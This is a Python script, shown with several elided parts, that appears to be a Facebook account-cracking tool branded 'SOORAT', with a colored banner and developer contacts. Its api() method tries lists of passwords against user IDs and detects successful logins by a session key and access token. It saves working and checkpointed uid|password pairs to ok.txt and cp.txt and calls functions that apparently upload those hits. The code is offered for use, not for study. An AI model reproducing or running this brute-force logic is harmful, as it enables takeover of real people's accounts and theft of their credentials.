...
def helpnote():
	...
	exit(" [*] FACEBOOK :  https://www.facebook.com/soorat.khan.77985741")
...
class Main:
	def __init__(self):
		...
		print ("""\033[1;91m  ###    ##     ## ######## 
\033[1;33m /$$__  $$ /$$__  $$ /$$__  $$| $$__  $$ /$$__  $$|__  $$__/
\033[1;32m| $$  \__/| $$  \ $$| $$  \ $$| $$  \ $$| $$  \ $$   | $$   
\033[1;33m|  $$$$$$ | $$  | $$| $$  | $$| $$$$$$$/| $$$$$$$$   | $$   
\033[1;32m \____  $$| $$  | $$| $$  | $$| $$__  $$| $$__  $$   | $$   
 \033[1;33m/$$  \ $$| $$  | $$| $$  | $$| $$  \ $$| $$  | $$   | $$   
\033[1;32m|  $$$$$$/|  $$$$$$/|  $$$$$$/| $$  | $$| $$  | $$   | $$   
 \033[1;33m\______/  \______/  \______/ |__/  |__/|__/  |__/   |__/   
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :            IHSAN DANISH
     \033[1;91m➣ \033[1;92mFACEBOOK   :            SOORAT
     \033[1;93m➣ \033[1;92mWHATSAPP   :            SILENT HERO
     \033[1;96m➣ \033[1;92mGITHUB     :            SOORAT KHAN
...
#				exit()
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX:SOORAT ): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;93m[>_] [SOORAT] : \033[0;97m %s/%s -> \033[0;92m [SOORAT-OK:%s ]- \033[0;93m[SOORAT-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[SOORAT-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [SOORAT-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[SOORAT-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [SOORAT-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
